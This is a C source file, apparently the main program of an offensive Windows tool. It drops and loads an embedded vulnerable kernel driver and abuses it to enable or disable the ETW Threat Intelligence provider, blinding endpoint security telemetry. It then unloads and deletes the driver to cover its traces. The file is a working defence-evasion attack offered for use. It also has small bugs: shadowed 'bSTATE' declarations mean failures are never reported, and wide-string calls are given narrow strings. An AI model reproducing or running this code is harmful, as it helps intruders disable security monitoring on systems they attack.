#include "common.h"
#include "vdriver.h"

// Print help message
void printHelp(char* fileName) {
	printf("Usage: %s -e / -d\n", fileName);
	printf("Options:\n");
	printf("  -e Enable ETwTi     - set ProviderEnableInfo field within the GUID entry to 0x1\n");
	printf("  -d Disable ETwTi    - set ProviderEnableInfo field within the GUID entry to 0x0\n");
	printf("  -h Display this help message.\n");
}

int main(int argc, char** argv) {

	BOOL	bSTATE				= TRUE;
	BOOL	bEnableETwTi		= TRUE;
	LPWSTR	szVulnDriverPath	= NULL;

	// If not enough arguments are supplied print the help function
	if (argc < 2) {
		printHelp(argv[0]);
		return EXIT_FAILURE;
	}

	if (strcmp(argv[1], "-h") == 0) {
		printHelp(argv[0]);
		return EXIT_FAILURE;
	}
	else if (strcmp(argv[1], "-e") == 0) {
		// Call function to enable ETwTi
		bEnableETwTi = TRUE;
	}
	else if (strcmp(argv[1], "-d") == 0) {
		// Call function to disable ETwTi
		bEnableETwTi = FALSE;
	}
	else {
		error("Unknown option: %s", argv[1]);
		printHelp(argv[0]);
		return EXIT_FAILURE;
	}

	// Load NtoskrnlOffsets from the internet and calculate required offsets
	info("LoadNtoskrnlOffsetsFromInternet - Loading NtoskrnlOffsets symbols from internet");
	if (!LoadNtoskrnlOffsetsFromInternet(TRUE)) {
		error("LoadNtoskrnlOffsetsFromInternet - Failed to load NtoskrnlOffsets symbols");
		return EXIT_FAILURE;
	}
	PrintOffsets();
	okay("LoadNtoskrnlOffsetsFromInternet - Loaded NtoskrnlOffsets symbols");
	printf("\n");

	// Write the vulnerable driver to the file system
	info("WriteDriverToFile - Writing vulnerable driver to filesystem");
	if (!WriteDriverToFile(g_VULNDRIVERFILENAME, cVDriver, cVDriverLength, &szVulnDriverPath)) {
		error("Failed to write driver to filesystem");
		if (szVulnDriverPath) {
			free(szVulnDriverPath); // Free the allocated memory
		}
		return EXIT_FAILURE;
	}
	okayW(L"WriteDriverToFile - Written vulnerable driver to \"%s\"", szVulnDriverPath);
	printf("\n");

	// Load the vulnerable driver as a service
	infoW(L"LoadDriver - Loading vulnerable driver from \"%s\" with name \"%s\"", szVulnDriverPath, g_VULNDRIVERNAME);
	if (!LoadDriver(g_VULNDRIVERNAME, szVulnDriverPath)) {
		error("LoadDriver - Failed to load driver");
		BOOL bSTATE = FALSE;
		goto _cleanUp;
	}
	okayW("LoadDriver - Loaded vulnerable driver, servicename: \"%s\"", g_VULNDRIVERNAME);
	printf("\n");

	// Disable or Enable ETwTi by patching ProviderEnableInfo field within the GUID entry
	info("ChangeETwTi - Changing ETwTi by abusing vulnerable driver and patching ProviderEnableInfo field within the GUID entry");
	if (!ChangeETwTi(bEnableETwTi)) {
		error("ChangeETwTi - Didn't change ETwTi");
		printf("\n");
		BOOL bSTATE = FALSE;
		goto _cleanUp;
	}
	info("ChangeETwTi - ETwTi ProviderEnableInfo value changed");
	printf("\n");

_cleanUp:

	// ** CLEANUP SECTION ** //

	// Unloading vulnerable driver
	infoW(L"UnloadDriver - Unloading vulnerable driver \"%s\"", g_VULNDRIVERNAME);
	if (!UnloadDriver(g_VULNDRIVERNAME)) {
		error("UnloadDriver - Failed to unload driver");
		BOOL bSTATE = FALSE;
	}
	okayW("UnloadDriver - Unloaded vulnerable driver \"%s\"", g_VULNDRIVERNAME);
	printf("\n");

	// Remove vulnerable driver from filesystem
	infoW(L"RemoveFileW - Vulnerable driver \"%s\"", szVulnDriverPath);
	if (!RemoveFileW(szVulnDriverPath)) {
		error("RemoveFileW - Failed to delete file");
		BOOL bSTATE = FALSE;
	}
	okayW("RemoveFileW - Deleted vulnerable driver \"%s\"", szVulnDriverPath);
	printf("\n");

	// Free allocated memory
	if (szVulnDriverPath != NULL) {
		free(szVulnDriverPath);
	}

	if (bSTATE) {
		return EXIT_SUCCESS;
	}
	else {
		return EXIT_FAILURE;
	}

}